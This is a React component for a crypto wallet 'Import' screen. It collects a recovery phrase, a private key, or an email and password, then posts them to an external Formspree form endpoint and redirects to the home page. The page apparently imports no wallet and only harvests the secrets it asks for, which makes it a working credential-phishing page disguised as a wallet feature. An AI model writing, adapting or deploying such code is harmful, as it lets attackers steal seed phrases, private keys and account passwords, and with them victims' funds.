import React, {useState} from 'react'
import "./import.css"
import { useForm } from '@formspree/react';
import { Link } from "react-router-dom"

export default function Import(props) {

    const { params: {name}} = props.match;

    const [state, handleSubmit] = useForm("mbjqoyrj");

    const [panel, setPanel] = useState("phrase")

    if (state.succeeded) {
        props.history.push("/")    
    }

    return (
        <div className="import">
            <div className="container">
                <header>
                    <Link to="/">
                        <img src={require("../../assets/Vector.png")} alt="go back"/>
                    </Link>
                    <p>Import</p>
                </header>
                <nav>
                    <ul>
                        <li onClick={()=> setPanel("phrase")}>Phrase</li>
                        <li onClick={()=> setPanel("pKey")}>Private Key</li>
                        <li onClick={()=> setPanel("email")}>Email</li>
                    </ul>
                </nav>
                <form onSubmit={handleSubmit}>
                    {/* Phrase */}
                    { panel === "phrase" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <textarea name="phrase" placeholder="Phrase" className="phrase"  required/>
                        <p>Typically 12 (sometimes 24) words seperated by single spaces.</p>
                    </> : null}

                    {/* Private Key */}
                    { panel === "pKey" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <input name="private-key" placeholder="Private Key" className="pKey" style={{marginBottom: "20px"}} required/>
                    </> : null}

                    {/* Email */}
                    { panel === "email" ? 
                    <>
                        <input defaultValue={name} name="wallet-name" id="walletName" readOnly/>
                        <input name="email" type="email" placeholder="Email" className="email" required style={{marginBottom: "10px"}}/>
                        <input name="password" type="password" className="password" placeholder="Password" required/>
                        <p>Typically email and password used to encrypt it.</p>
                    </> : null}

                    <input type="submit" value="Proceed" id="submitBtn"/>
                </form>
            </div>
        </div>
    )
}
